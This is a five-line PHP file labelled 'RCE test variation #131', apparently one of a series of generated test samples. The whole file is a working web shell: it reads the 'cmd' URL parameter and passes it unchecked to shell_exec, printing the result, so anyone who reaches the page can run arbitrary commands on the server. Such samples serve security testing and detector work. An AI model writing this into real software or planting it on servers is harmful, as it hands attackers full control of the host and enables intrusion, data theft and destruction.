<?php
// RCE test variation #131
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>